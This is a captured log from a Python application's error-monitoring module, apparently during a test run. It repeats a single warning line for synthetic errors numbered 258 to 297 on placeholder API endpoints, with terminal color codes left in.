WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697314Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 258'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697363Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 259'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697412Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 260'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697463Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 261'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697513Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 262'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697562Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 263'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697611Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 264'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 265'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697776Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 266'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 267'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 268'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697991Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 269'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698043Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 270'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698092Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 271'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698141Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 272'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698192Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 273'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698301Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 274'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698372Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 275'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698426Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 276'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698477Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 277'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698528Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 278'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698579Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 279'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 280'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698745Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 281'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698836Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 282'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 283'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.698972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 284'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699024Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 285'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699075Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 286'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699125Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 287'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699189Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 288'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699242Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 289'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699291Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 290'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699340Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 291'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699387Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 292'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699435Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 293'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699484Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 294'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 295'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699590Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 296'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699693Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 297'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
